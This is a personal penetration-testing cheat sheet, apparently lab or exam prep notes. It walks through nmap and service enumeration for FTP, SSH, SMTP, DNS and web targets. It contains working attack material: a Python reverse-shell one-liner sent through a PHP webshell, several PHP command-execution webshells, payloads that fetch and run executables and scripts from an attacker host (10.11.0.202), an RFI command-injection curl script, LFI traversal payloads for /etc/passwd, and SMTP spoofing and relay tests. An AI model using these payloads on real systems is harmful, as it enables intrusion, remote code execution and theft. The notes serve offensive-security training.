#### Info-sheet recon info for target
- DNS-Domain name:
- Host name:
- OS:
- Server:
- Kernel:
- Workgroup:
- Windows domain:
- samba version
- web server
- sctipting language
Services and ports:

INSERTTCPSCAN

#### Juypter Notebook find and replace the following
```
Esc + F Find and replace on your code but not the outputs.

Find&replace *target* with the target IP address  //DONE

find&replace *target-domain* with target domain name  //TODO

find&replace *localhost* with localhost ip address

find&replace *dollar-sign* with /*dollar-sign* //TODO known issue /*dollar-sign* will change the markdown language. Remove this line. 
```

### one hour prior reboot and take a snapshot of attack station

### Create three lists in a workbook

```bash
Username:password
Usernames
Passwords
```
### Test viper shell with lab environment

### Start wireshark or TCPDUMP after you get the p0f info


```
Review the wireshark capture to verify vpn is correct
```
### tcpdump examples

```
tcpdump no hostnames hex interface capture everything
tcpdump -nX -I tap0 -s0 labhacking1.pcap
tcpdump -n -r labhacking1.pcap pcap | awk -F" " '{print dollarsign with 3}' | sort -u | head
tcpdump -nnvXSs 0 -c1 icmp

```
### Start Metasploit in TWO windows

msfdb init

db_status

workspace

workspace msfu

Creating and deleting a workspace one simply uses the ‘-a‘ or ‘-d‘ followed by the name at the msfconsole prompt.

workspace -a lab4

workspace -d lab4

Set the workspace

Msf>db_import my.xml

Or redo the scans from inside msf workspace

Msf>db_nmap -n -A target

Review services

Msf> services

Msf > search services

### Start any custom password sniffing tools

Start metasploit smb password sniffer
Use auxillery/sniffer/psnuffle


### Recon


If this default attack plan fails you then go to the PWK Workbook and navigate to the “tips for pwk” tab. Then review scripts and links and try harder!

#### My Backup attack plan if all else fails

If this doesn’t work then get back to basics and break out the books. First go to your google drive and look into the books one 
by one starting with

•	Open up your saved pcap file inside “network miner”

•	Upload danderspritz and fuzzbunch to win7 host

•	Review both metasploitable 1 and 2 hacking guides

•	Web app pen testing

•	ftp pen testing

•	sql

•	Open up your kindle and review books one by one

•	review your hacking with metasploit reference guide

•	review your python for penetration guide

•	hacking tutorials folder (google drive)

•	Effective python for pentration testing

•	Go to the local book shelf and review books

•	Review 560 sample pentesting report

•	Review pwk how to pentest guide and videos

•	Scanners (googledrive)

•	Mytechnotes

•	Bruteforce

•	GO here

o	https://crowdshield.com/blog.php?name=pwning-windows-domains-from-the-command-line

Then if that fails open the windows default attack plan and the linux default attack plan.


### START ATTACK PLAN

Refer to the following items within the pen testing red workbook

•	Discovery and foot printing

•	Unicorn

•	Scanning

•	NMAP

•	TELENT

•	RPCBIND

NOTE: Always start with a stealthy scan to avoid closing ports.

### GOOGLE DORKS

www.exploit-db.com/google-dorks

### SEARCH ENGINES
www.yandex.com


### NetDiscover

netdiscover

### Syn-scan

Make a list of targets from the list of targets provided

Do a synscan for the top 20 ports and then do a synscan for all ports

nmap -sS  --top-ports 20 --open *target*

nmap -sS -p- *target* -oX synscan1.xml

nmap -sS --open *target* -oX synscan-open.xml {Just open connections - nice clean output}

```
Insert Scan

```

### Service-version, default scripts, OS:

Do a service and OS scan for the top 20 ports

nmap *target* -sV -O -top-ports=20 -oX service_scan1.xml

nmap -sV --version-intensity 5 *target*

nmap -sSV --stats-every 5 *target*

```
Insert Scan

```

### Scan all ports, might take a while.

Do a full scan of all ports

nmap -sV -O -p- *target* -oX all_ports_service_scan1.xml

nmap *target* -p- -T4 -A -PN -oX full_agressive-scan1.xml

```
Insert Scan

```
### Port knocking with hping

What we are doing here, is using the hping3 command, pointing it at our IP address, then specifying a port number (e.g -p 1) then how many “pings” to send (in this case just the one e.g -c 1)

Do this for each port 1, 2 and 3, and now lets perform another NMAP scan, see what turns up!

Only if you get a hint of port knocking first try

```
knock 192.168.57.102 1 2 3
```
then try 
```
#!/bin/sh

echo -n "*" | nc -q1 -u *target-domain* 12345
echo -n "*" | nc -q1 -u *target-domain* 23456
echo -n "*" | nc -q1 -u *target-domain* 34567
ssh www.example.com

#!/bin/sh

hping3 *target* --udp -c 1 -p 12345
hping3 *target* --udp -c 1 -p 23456
hping3 *target* --udp -c 1 -p 34567
ssh root@*target*

```



### nmap script shortcut

run

locate nse |grep script

locate nse |grep http

to update scripts for nmap ***--script-update-db***

to debug scripts use ***--script-trace***. this will enable a stack trace of the executed scripts

-sC Performs a script scan using the default set of scripts. It is equivalent to --script=default. Some
of the scripts in this category are considered intrusive and should not be run against a target
network without permission.

the flag --script-args is used to set arguments of nse scripts



### nmap script example for discovery

nmap --script default *target*

nmap --script discovery *target*


### recon: In a big network first get a good list of Live hosts, 


-T*0-5*: Set timing template (higher is faster)

-sn: Ping Scan - disable port scan

1. nmap -sn -T4 -oG Discovery.gnmap *target*/24 > live_hosts_list

2. grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' > LiveHosts.txt

3. nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt

4. Or ping the subnet and handbomb a LiveHosts list. 



### Start the p0f tool and try to passively fingerprint hosts

http://lcamtuf.coredump.cx/p0f3/


Read the fingerprint database from p0f.fp and output to p0f.log

```
p0f -I tap0 -p -f /etc/p0f/p0f.fp -o p0f.log

-p is promisc mode


```

### IDENTIFY THE NETWORK INFRASTRUCTURE


•	Enumerate hosts

•	Finger Print Operating systems

•	Nmap -sS -O *target*

•	Make directory structure ~/exam_pwk/hosts

Choose last octets of ip address for dirs


### SCAN.SH from GL

Scan for vulns with ./scan.sh *ip address* vuln --force

```

```

### TCP connect scan

nc -nvv -w 1 -z *target* 3388-3390

### Nmap Broadcast scan

nmap --script=broadcast --script-args=*target*/24

### Nmap scan for backdoors

nmap --script ftp-proftpd-backdoor victim

ftp-proftpd-backdoor.nse

ftp-vsftpd-backdoor.nse

irc-unrealircd-backdoor.nse


### Scan for UDP

T: = tcp 

nmap INSERTIPADDRESS -sU

nmap -v -sU -sT -p U:53,69,111,137,T:21-25,80,139,8080,T:160-162 *target*

nmap -v -sV -sU -sT -p U:53,69,111,137,T:21-25,80,139,8080,T:160-162 *target*

nmap -sU -p- *target*

nc -nv -u -z -w 1 *target* 160-162  > look within wireshark for OPEN ports


### UnicornScan

unicornscan -mU -v -I INSERTIPADDRESS

us -H -msf -Iv *target* -p 1-65535 

us -H -mU -Iv *target* -p 1-65535

```
•	-H resolve hostnames during the reporting phase 
•	-m scan mode (sf - tcp, U - udp)
•	-Iv - verbose
```
us -H -msf -Iv *target* -p 1-65535  > us_10_11_1_5

us -mU -r200 -I *target* -p 1-65535  > us_10_11_1_5_udp

### Connect to udp if one is open

nc -u INSERTIPADDRESS 48772

### Monster scan

nmap INSERTIPADDRESS -p- -A -T4 -sC


### NDiff for nmap


Ndiff is a tool to aid in the comparison of Nmap scans. Specifically, it takes two Nmap XML output files and prints the 

differences between them:
```
ndiff [ <options> ] { <a.xml> } { <b.xml> }
```

We will use the option -oX and a filename.xml which will save the nmap outputs in a xml file

```
ndiff [filename.xml filename2.xml]
```

Ndiff also provides the ability to produce the results in XML output with the -xml option.This option is useful in cases where 

we want to import the information from Ndiff into a third party tool that uses this format



### nmap Generating an HTML scan report

nmap -A -oX results.xml

Next run xslproc to transorm the xml file to html/css

First get xslproc and then use the tool

apt-get install xsltproc

Root> xsltproc results.xml -o results.html

### Example nmap vulns unsafe html report

nmap -v --top-ports=20 --script=vuln script-args=unsafe *target* -oX vulns-results.xml

xsltproc vulns-results.xml -o results.html

### Get network routing information


tcptraceroute *target* or *domainname*

tctrace -I tap0 -d *domainname*

ping

#### ping command for ipv6

ping6


### arping

arping *target* -c 1


### DEEPMAGIC INFORMATION GATHERING TOOL

use with external ip or domain names

dmitry -iwnse *target*or*targethost*

use with internal ip ranges

dmitry -p *target* -f -b


```

```


### banner grabbing

nmap -sV -sT *target*

### list all services in a chart and then list all nmap scripts for that service

ls -lh /usr/share/nmap/scripts/*ssh*
ls -lh /usr/share/nmap/scripts/*smb*

### NBTSCAN

Nbtscan -r *target*/24

### Port 21 - FTP

Refer to pen testing red workbook 

- Enumeration tab
- FTP-Name:
- FTP-version:
- Anonymous login:
- CeasarScan.py
- bulletftp.py
- ftpanon.py
- ftprand.py

INSERTFTPTEST

Open up web browser and browse to

ftp://*ipaddress*

nmap -v -p 21 --script=ftp-anon.nse *target*-254
```
insert scan

```

nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 *target*


```
insert scan


```

### Nmap scan for ftp backdoors

nmap --script ftp-proftpd-backdoor -iL LiveHosts.txt

nmap --script-help ftp-proftpd-backdoor

ftp-proftpd-backdoor

Categories: exploit intrusive malware vuln


#### python ftpanon.py *target*/24

#### FTP quick commands

mode

binary

nlist

get file location

cd ../

cd c:\  #hopefully you can see a good error message for location

250 CWD command successful. "/c:/x/y/Shared" is current directory.

dir

```
can you get files
```
ascii

get file location

get "/..c:\Documents and settings\administrator\Desktop\proof.txt" /root/ 

get "/../c:\Documents and settings\Administrator\Desktop\proof.txt" /root/ 

get "/Python26/python.exe" /root/pwk_recon/



### Don’t use MSF on exams

MSF Auxiliary FTP scan

MSF FTP Version

MSF anaonymous login scan

### Port 22 - SSH

- Name:
- Version:
- Takes-password:
- If you have usernames test login with username:username

you could try to connect using lists

```
ssh -L users.txt -P passwords.txt -s 22

```

INSERTSSHCONNECT


nc *target* 22

```

```


### SSH automated banner grabbing

```
root@kali:~# nmap *target* -p 22 -sV --script=ssh-hostkey
...SNIP...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  1024 72:b5:55:80:1b:24:d6:f3:bf:a5:c5:98:1b:01:03:90 (DSA)
...SNIP...
root@kali:~#
```

### PORT 23 Telnet


- Telnet port 23 open 

- Fingerprint server 

- telnet ip_address 

Common Banners

```
ListOS/BannerSolaris 8/SunOS 5.8Solaris 2.6/SunOS 5.6Solaris 2.4 or 2.5.1/Unix(r) System V Release 4.0 (hostname)SunOS 4.1.x/SunOS Unix (hostname)FreeBSD/FreeBSD/i386 (hostname) (ttyp1)NetBSD/NetBSD/i386 (hostname) (ttyp1)OpenBSD/OpenBSD/i386 (hostname) (ttyp1)Red Hat 8.0/Red Hat Linux release 8.0 (Psyche)Debian 3.0/Debian GNU/Linux 3.0 / hostnameSGI IRIX 6.x/IRIX (hostname)IBM AIX 4.1.x/AIX Version 4 (C) Copyrights by IBM and by others 1982, 1994.IBM AIX 4.2.x or 4.3.x/AIX Version 4 (C) Copyrights by IBM and by others 1982, 1996.Nokia IPSO/IPSO (hostname) (ttyp0)Cisco IOS/User Access VerificationLivingston ComOS/ComOS - Livingston PortMaster 
```
- telnetfp 

- Password Attack 

- Common passwords 

- Hydra brute force 

- Brutus 

- telnet -l "-froot" hostname (Solaris 10+) 

#### Examine telnet configuration files 

- /etc/inetd.conf 

- /etc/xinetd.d/telnet 

- /etc/xinetd.d/stelnet 


### Port 25 SMTP

https://pen-testing.sans.org/resources/papers/gcih/smtp-victim-good-time-105208

- Name:

- Version:

```

nc -nvv INSERTIPADDRESS 25
HELO foo<cr><lf>
INSERTSMTPCONNECT
```

#### Telnet SMTP

- telnet *target* 25

- VRFY root

##### VRFY:
Is Port 25 open 

Fingerprint server 

1. telnet *target* 25 (banner grab) 

2. VRFY root

#### Mail Server Testing 

- Enumerate users 
- VRFY username (verifies if username exists - enumeration of accounts) 
- EXPN username (verifies if username is valid - enumeration of accounts) 

#### Mail Spoof Test 

- HELO anything MAIL FROM: spoofed_address RCPT TO:valid_mail_account DATA . QUIT 

#### Mail Relay Test 

- HELO anything 
- Identical to/from - mail from: *nobody@domain> rcpt to: <nobody@domain> 
- Unknown domain - mail from: <user@unknown_domain> 
- Domain not present - mail from: <user@localhost> 
- Domain not supplied - mail from: *user* 
- Source address omission - mail from: <> rcpt to: <nobody@recipient_domain> 
- Use IP address of target server - mail from: <user@IP_Address> rcpt to: <nobody@recipient_domain> 
- Use double quotes - mail from: <user@domain> rcpt to: <"user@recipent-domain"> 
- User IP address of the target server - mail from: <user@domain> rcpt to: <nobody@recipient_domain@[IP Address]> 
- Disparate formatting - mail from: <user@[IP Address]> rcpt to: <@domain:nobody@recipient-domain> 
- Disparate formatting2 - mail from: <user@[IP Address]> rcpt to: <recipient_domain!nobody@[IP Address]> 

#### Examine Configuration Files 

- sendmail.cf 

- submit.cf 

#### SMTP Nmap

```
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 *target*
```

```
insert smtp scasn here

```

There is a custom SMTP python scanner in PWK workbook and within my custom scripts



### Email Harvesting

theharvester -d cisco.com -b google >google.txt

theharvester -d cisco.com -l 10 -b bing >bing.txt

### PORT 53 DNS

Refer to Pen testing red workbook tab for Enumeration
- Enumeration tab
- Conduct scans for port 53

### dig

### dns-axfr.sh

Located in viper

### dnsgrab.sh

Located in viper

### forward.sh

Located in viper

### reverse.sh

Located in viper

### zone-transfer.sh

Located in viper

### zt.sh

Located in viper

### dnsenum zonetransfer.me

### manual methods for DNS zone transfers

```
Find the DNS servers for the LAB Domain
1.	Host -I thinc.local *target*
2.	host -t ns megacorpone.com
3.	host -t mx megacorpone.com
4.	find / -name dns.txt
a.	/usr/share/dnsenum/dns.txt
5.	modified my ./forward.sh script
6.	host master.thinc ipaddress
7.	host slave.thinc ipaddress
8.	host -t axfr thinc.local *target*
9.	Use dnsrecon to attempt a zone transfer
10.	dnsrecon -d thinc.local -n *target* 0 -t afxr
11.	dnsrecon -d thinc.local -n *target* -a
```

### dnsdict6 will help enumerate ipv6 dns names

### fierce

Fierce -dns example.com -threads 3

### nmap dns zone transfers

nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com

#### nmap dns brute scan

nmap -p 80 --script dns-brute.nse vulnweb.com

### Port 69 - UDP - TFTP

This is used for tftp-server.

TFTP port 69 open 
o	TFTP Enumeration 
o	tftp *target* PUT local_file 
o	tftp *target* GET conf.txt (or other files) 
o	Solarwinds TFTP server 
o	tftp - i *target* GET /etc/passwd (old Solaris) 
TFTP Bruteforcing 
o	TFTP bruteforcer 
o	Cisco-Torch 


### PORT 79 FINGER

Finger Port 79 open 

```
User enumeration 
o	finger 'a b c d e f g h' @example.com 
o	finger admin@example.com 
o	finger user@example.com 
o	finger 0@example.com 
o	finger .@example.com 
o	finger **@example.com 
o	finger test@example.com 
o	finger @example.com 
Command execution 
o	finger "|/bin/id@example.com" 
o	finger "|/bin/ls -a /@example.com" 
Finger Bounce 
o	finger user@host@victim 
o	finger @internal@external
```

### Port 80 / 8080 - Web server
- Server:
- Scripting language:
- Apache Modules:
- IP-address:
- Domain-name address:

REF: Web Penetration testing with KALI LINUX

Review  chapter 4 inside the web hacking handbook on kindle

before jumping into the web application, let's check the headers from the web server and default landing page:

#### Nmap scan http headers

nmap --script http-headers *target domain name or *target*

```
incert nmap http-header-info
```





example: of getting header information

```
root@kali:~# curl -i *target*
```

```
HTTP/1.1 302 Found
Date: Mon, 16 May 2016 22:39:48 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.4
Location: site/index.php/
Content-Length: 0
Content-Type: text/html
root@kali:~#
INSERTCURLHEADER

```

```
curl  -L *target* | grep "title\|href" | sed -e 's/^[[:space:]]*//'
```
In case you have to follow a redirect

```
curl -i -L *target*
```

- domain name or target index page: http://*target-domain*
- Web application (ex, wordpress, joomla, phpmyadmin)
- Server type or name:
- Version:
- Admin-login:


#### See what the web page renders like

```
curl  -L *target-domain*/index.php,html* | html2text -width '99' | uniq

```

look for the changelog if you can. Spider the host if you need to find it

```
curl *target-domain*/readme.md
```

look for every other file


### Clone Website

### HTTrack

1.	apt-get install httrack
2.	mkdir website
3.	root> httrack
4.	and enter url
5.	cd websites
6.	research targets website and possible build a exploit

### wget

wget -r http://website.com

### Nikto

nikto -update

nikto -h http://*target*

##### Nikto with non standard port

nikto -h http://*target* -p 9999 *port number*

```
INSERTNIKTOSCAN



```

### Nikto Tunning

nikto -h http://*target* -Tuning=1

##### Nikto tuning options 

```
0 – File Upload
1 – Interesting File / Seen in logs
2 – Misconfiguration / Default File
3 – Information Disclosure
4 – Injection (XSS/Script/HTML)
5 – Remote File Retrieval – Inside Web Root
6 – Denial of Service
7 – Remote File Retrieval – Server Wide
8 – Command Execution / Remote Shell
9 – SQL Injection
a – Authentication Bypass
b – Software Identification
c – Remote Source Inclusion
x – Reverse Tuning Options (i.e., include all except specified)
```

### Nikto with squid proxy

nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444

### uniscan

uniscan-u http://*target* -qweds

### Uniscan-GUI

Type “Uniscan-Gui” 

### WHATWEB

Whatweb -v target.website.com

### wikto

### Nmap port 80/443

nmap --script http-webdav-scan -p80,8080 *target*

nmap --script http-iis-webdav-vuln -p80,8080 *target*


### ZENMAP

1.	Intense scan
2.	Profile tab
3.	Profile name and desc
4.	Targets ip/24
5.	Select -PN
6.	Save changes and scan

### FOCA - website metadata recon

1.	Get the latest version from website (use google to translate to engligh)
2.	http://www.informatica64.com/DownloadFOCA
3.	Create a new project
4.	Keep all projects in one place
5.	File > new project > create
6.	Click SEARCH ALL
7.	Right click on the files and > Extract metadata
8.	Right-click on the file and select ANALYZE metadata
9.	The following screen shot may show people who have worked with the document


### nmap test for sql injection

nmap -sV  –script=http-sql-injection www. testphp.vulnweb.com –p 80

### Webdav

### Davtest

```
./davtest.pl -URL http://*target*/Scripts -uploadfile /var/www/html/shell.asp.txt -uploadloc shell.asp.txt
```

```
root@kali:~/Downloads/davtest-1.0# nc 10.11.1.13 80 -vv
10.11.1.13: inverse host lookup failed: Unknown host
(UNKNOWN) [10.11.1.13] 80 (http) open
COPY /Scripts/shell.asp.txt HTTP/1.1
HOST: 10.11.1.13
Destination: http://10.11.1.13/Scripts/shell.asp
Overwrite: T
```

### cadaver

Cadaver http://*target*/webdav

Username: wampp

Password:

Webdav> put.txt

### Get header

focus more on the web apps or hidden directories here

curl -i *target*

### Get everything web

curl -i -L *target*

### Check for title and all links

curl *target* -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

### Look at page with just text

curl *target* -s -L | html2text -width '99' | uniq

### Check if it is possible to upload

```
curl -v -X OPTIONS http://*target*/

curl -v -X PUT -d '<?php system(*dollar-sign*_GET["cmd"]); ?>' http://*target*/test/shell.php

dotdotpwn.pl -m http -h *target* -M GET -o unix

```

### plecost scan

plecost -n 100 -s 10 -M 15 -i /usr/share/plecost/wp_plugin_list.txt *target*/wp

### Url brute force

Not recursive

### Dirb

```
dirb http://*target* -r -o dirb-INSERTIPADDRESS.txt
```

start dirbbuster gui with 

```
run root> dirbuster
```
and get a gui for manual testing

```
INSERTDIRBSCAN
```

Some of the mentioned tools come with their own wordlists with them (such as DirB & wfuzz)

***Important do the dirb scan with multiple word lists***

```
DirB - /usr/share/dirb/wordlists/
wfuzz - /usr/share/wfuzz/wordlist/
SecList - /usr/share/seclists/
```

Example of scanning with dirb wordlists

```
dirb http://*target*/action=/news/ /usr/share/dirbuster/wordlists/directory-list-1.0.txt
```

once your url brute forcing is completed you may now go back and curl specific headers from other items of interest
example

```
http://*target*/cgi-bin/admin.cgi

http://*target*/cgi-bin/test.cgi

curl -i http://*target*/cgi-bin/admin.cgi

curl -i http://*target*/cgi-bin/admin.cgi -s | html2text

```

### Nmap URL bruteforce

nmap --script http-enum *target*


nmap --script -http-enum --script-args http-enum.basepath='pub/' *target*


### Burp RECON

Use burp suite right away and spider the host looking for intel

Refer to burp suite essentials book on kindle if needed. 


### Gobuster

remove relevant responde codes (403 for example)

```
gobuster -u http://*target* -w /usr/share/seclists/Discovery/Web_Content/common.txt //
-s '200,204,301,302,307,403,500' -e


gobuster -u http://*target*/   -w /usr/share/seclists/Discovery/Web_Content/cgis.txt //
-s '200,204,403,500' -e

gobuster -u http://*target*/ -w /usr/share/wordlists/wfuzz/general/common.txt

gobuster -u http://*target-domain*/ -w /usr/share/seclists/Discovery/Web_Content/common.txt //
-s '200,204,301,302,307,403,500' -e

```

Re-read the help file located here and try some scans

https://github.com/OJ/gobuster

### golismero scan

If something is wrong with the command then just remove that part of the script and keep going

ref:

https://ourcodeworld.com/articles/read/412/how-to-search-for-security-vulnerabilities-in-a-website-using-golismero-in-kali-linux

```
golismero --plugin-list

golismero scan *target*

golismero scan http://*target*/wp/wp-login -e spider -e plecost -e theharvester -e exploitdb -e nmap -e nikto //
--host http://*target*/wp/ -e heartbleed -o golimreport.html
```

***Reminder*** these scans may crash the webserver and you may need to wait for a reboot of revert your lab machine at this 

point. Then go back and try some random scans to confirm correct

You may also want to reboot your attack station

Also if you get no page rendered check to make sure burpsuite and the firefox proxy are correct.


### HTTP FINGERPRINT

### w3af

w3af
help
plugins
help
back
output
output console, htmlFile
audit
audit httaccessmethods, osCommanding, sqli, xss, shellshock
Back
Target
Set target http://test.target.example.com/
back
run

### Mapping the web application

At this point you should already be mentally mapping the web application. 

•	Enumerating content and functionality

•	Discovering hidden content

•	Using public search engines

•	Leveraging vulnerability scanners

•	Analyzing the application

•	http fingerprinting

•	banner grabbing

•	Exploiting application behavior

•	If you have more questions refer to chapter 4 in the web app hackers handbook

#### Wafw00f

Is a very usefull python script capable of detecting WAF firewall

wafw00f

wafw00f http://www.example.net

### BBSQL

### HTTRACK

### PAROS

### powerfuzzer

### SKIPFISH

### SklNinja

### Websploit

### WPScan

### PARSERO

Curl *target*/robots.txt -s | html2text

parsero -u 10.11.1.71

### Web Application (Accessing The Source Code)

Go to github or elsewhere and look for the source code.

one of the key files we see is called "/README.md".

Go to the github site and find the readme

```
Curl *target*/README.md

Curl *target*/README.md | HEAD -n 40
```
Get the version anyway possible

### FireFox Toolbar hackbar options

Quickly build the websites on your local webserver

VIEW SCRIPTS AND LOOK FOR THINGS WITH COMMENTS OR CODES

A few things we like to check are : comments (as these wouldn't be seen when rendered), the web application name / version, and 

links to other pages/domains.

#### HACKBAR

### Content Management Websites

### Wordpress

wpscan --url  https://*target*:12380/blogblog/ --enumerate uap

### Drupal

For drupal go to the kindle book reader and use the drupel hacking book

nmap --script=http-drupal-enum-users drupal.org -p 80,443 -Pn

### FIREBUG

Look for comments in the code and try to remove them. 

#### COOKIES MANAGER +	

#### NO SCRIPT

#### GREASE MONKEY

### Default/Weak login

Search documentation for default passwords and test them

```
site:webapplication.com password
```

```
admin admin
admin password
admin <blank>
admin <servicename>
root root
root admin
root password
root <servicename>
<username if you have> password
<username if you have> admin
<username if you have> username
username <servicename>
```


### Local file inclusion - 

you are trying to run commands locally on the box from a remote box

path traversal

Refer to the LFI commands in the web pentesters workbook first

Have a quick look in the Advanced Kali hacker book

### LFISuite

### fimap

fimap --install -plugins

fimap -u ‘http://target.website.com’

fimap -force-run -u “http://target.website.com/?p=2475”

fimap -u "http://*target*/example.php?test="

### kadimus LFI and RFI

https://github.com/P0cL4bs/Kadimus


### LFI pwn

https://github.com/m101/lfipwn

### lfiscan.py

Located in viper-shell

### Lfifuzz.py

Located in viper-shell


### coldfussiondir_traversal.py

### LFI Manual testing

```
Netcat *target* 80

<?php echo shell_exec(*dollar_sign*_GET['cmd']);?>

Including files in the same directory:

?file=.htaccess

Path Traversal:

?file=../../../../../../../../../var/lib/locate.db

(this file is very interesting because it lets you search the filesystem, other files)

Including injected PHP code:

?file=../../../../../../../../../var/log/apache/error.log

Null Byte Injection:

?file=../../../../../../../../../etc/passwd%00

(requires magic_quotes_gpc=off)

Directory Listing with Null Byte Injection:

?file=../../../../../../../../../var/www/accounts/%00

(UFS filesystem only, requires magic_quotes_gpc=off, more details here)

Path Truncation:

?file=../../../../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\.\.\ …

(more details see here and here)

Dot Truncation:

?file=../../../../../../../../../etc/passwd……………. …

(Windows only, more details here)

Reverse Path Truncation:

?file=../../../../ […] ../../../../../etc/passwd

```

### Burp LFI manual injections

use burp intruder to inject sql from wordlists

```
/usr/share/wfuzz/wordlist/traversals.txt
```


### PHP & LFI with python to shell script

Localhost > nc –lvp 443

```
Shell.php?cmd=python%20-c%20'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHPbbscan.txt

Located in viper however you will need to find or create vuln.txt

### PHP Webshell reminders


start a tcpdump capture with ICMP 

```
Root@kali> tcpdump icmp[icmptype]=icmp-echo -vvv -s 0 -X -i any -w ping.pcap

```
then create a ping.txt script to /var/www/html on my localhost

I added the following script to ping.txt

```
<pre style="text-align:left;">

<?php

echo shell_exec('ping -n 1 10.11.0.202');

?>
</pre>

```

Then I executed the script with the LFI on the target

```
http://10.11.4.94/addguestbook.php?name=Test&comment=Which+lang%3&LANG=http://10.11.0.202/ping.txt%00&Submit=Submit

```
### PHP Webshell stuff

```
<?php echo shell_exec(*dollar-sign*_GET['cmd']);?>

<?php phpinfo()?>

<?php echo shell_exec('ping -n 1 10.11.0.202');?>

<?php *dollar-sign*output = shell_exec("/bin/pwd"); echo "<pre>*dollar-sign*output</pre>"; ?>' WHERE ROWID = 1

<?php *dollar-sign*output = shell_exec("/bin/ls -la"); echo "<pre>*dollar-sign*output</pre>"; ?>' WHERE ROWID = 1

<?php *dollar-sign*output = shell_exec("whereis cat 2>/dev/null");echo"<pre>*dollar-sign*output</pre>"; ?>' WHERE ROWID = 1
cat: /bin/cat /usr/share/man/man1/cat.1.gz /usr/src/bin/cat

<?php *dollar-sign*output = shell_exec("/usr/bin/find / -perm -4000 -type f 2>/dev/null");echo"<pre>*dollar-sign*output</pre>"; ?>' WHERE ROWID = 1

<?php *dollar-sign*output = shell_exec("/usr/bin/find / base64 2>/dev/null");echo"<pre>*dollar-sign*output</pre>"; ?>' WHERE ROWID = 1

<?php *dollar-sign*output = shell_exec("ps aux");echo"<pre>*dollar-sign*output</pre>"; ?>' WHERE ROWID =
Listing directorys and permissions

<?php *dollar-sign*output = shell_exec("/usr/bin/find / ! -user root -type d -ls");echo"<pre>*dollar-sign*output</pre>"; ?>' WHERE ROWID = 1
proof of concept below

<?php *dollar-sign*output = shell_exec("/usr/bin/perl /usr/local/databases/evil.pl");echo"<pre>*dollar-sign*output</pre>"; ?>' WHERE ROWID = 1

<?php *dollar-sign*output = shell_exec('/usr/bin/fetch -o /var/tmp/21bsd http://10.11.0.202/bsd21rev');echo"<pre>*dollar-sign*output</pre>"; ?>' WHERE ROWID = 1

<?php *dollar-sign*output = shell_exec("/usr/bin/fetch -o /var/tmp/28718.c  http://10.11.0.202/28718.c");echo"<pre>*dollar-sign*output</pre>"; ?>' WHERE ROWID = 1

<?php *dollar-sign*output = shell_exec("/usr/bin/fetch -o /var/tmp/LinuxEnum.sh  http://10.11.0.202/LinuxEnum.sh");echo"

<pre>*dollar-sign*output</pre>"; ?>' WHERE ROWID = 1

```





### Ordered output

curl -s http://*target*/gallery.php?page=/etc/passwd

/root/Tools/Kadimus/kadimus -u http://*target*/example.php?page=

### WEBSHELLS
https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp

### RFI

### rfiscan.py

Located in viper-shell

Python RFIscan.py -t target -s domain -write rfi_found.txt -v 

We will try to get the webserver to access a script on an external website
1.	First try to create an evil php program and store it on kali
2.	Visit the target website and call our script in the url
3.	See the advanced kali hacker book for more details

#### Upload shell through pictures

https://null-byte.wonderhowto.com/how-to/upload-shell-web-server-and-get-root-rfi-part-1-0162818/

https://null-byte.wonderhowto.com/how-to/upload-shell-web-server-and-get-root-rfi-part-2-0162854/

#### upload shell through RFI

http://securityxploded.com/remote-file-inclusion.php

#### from RFI to shell

https://penetrate.io/2014/01/10/from-rfi-to-shell/

#### exploit RFI

https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

#### My scripts

put the following contents into a payload.php

```
<pre style="text-align:left;">

<?php

//file_put_contents("C:\Users\Offsec\AppData\Roaming\Microsoft\Windows\Start //Menu\Programs\Startup\ViperClient.exe", 

fopen("http://10.11.0.202/ViperClient.exe", 'r'));

//echo shell_exec("C:\Users\Offsec\AppData\Roaming\Microsoft\Windows\Start //Menu\Programs\Startup\ViperClient.exe");
	
file_put_contents("C:\Users\ViperClient.exe", fopen("http://10.11.0.202/ViperClient.exe", 'r'));

echo shell_exec("C:\Users\ViperClient.exe");

?>

</pre>

```
Then go to the website and execute the payload.php

http://*target*/addguestbook.php?name=Test&comment=Which+lang%3&LANG=http://10.11.0.202/payload_execute.txt%00&Submit=Submit



### reverse web shell in /usr/share/webshells/php

***REMINDER*** 

when copy your shell from the webshells to the /html / remember when you upload them to the tartget that you need to take note 
of the .txt and copy the file from shell.php to shell.php.txt before you copy it from the attacker to the target. 

php-nc-shell.php and opened the file in a text editor. Then I editied the ip and LPORT. 

Copy the file into /var/ww/html /php-nc-shell.php

to upload files to a server with the webdav vulnerability copy the following script into a file called 11-208.sh and then you can upload your php-nc-shell.php to the server by running the following shell script

```
 
#!/bin/bash
 
if [ -z "*dollar-sign*1" ]; then
        echo "No remote command given"
        exit 1
fi

curl -s --data "<?system('*dollar-sign*{*}');?>" "http://*ipaddress*/internal/advanced_comment_system/admin.php?ACS_path=php://input%00" | egrep -v ' *<.*' | grep -v -i "check variable"
 
```

I upload the exploit.php.txt using the script 11-208.sh that we just created with the following command :

```
root@kali:/var/www# ./11-208.sh wget http://*target*/php-nc-shell.php.txt -O /tmp/php-nc-shell.php
```

I controll that the file was upload in the /tmp/ of the target: Below we can list the /tmp file

```
root@kali:/var/www# ./11-208.sh ls -lh /tmp/

```
Then I used netcat or meterpreter. 

nc -lvp 443


<?php include(*dollar-sign*_GET['file'] . ".htm"); ?>

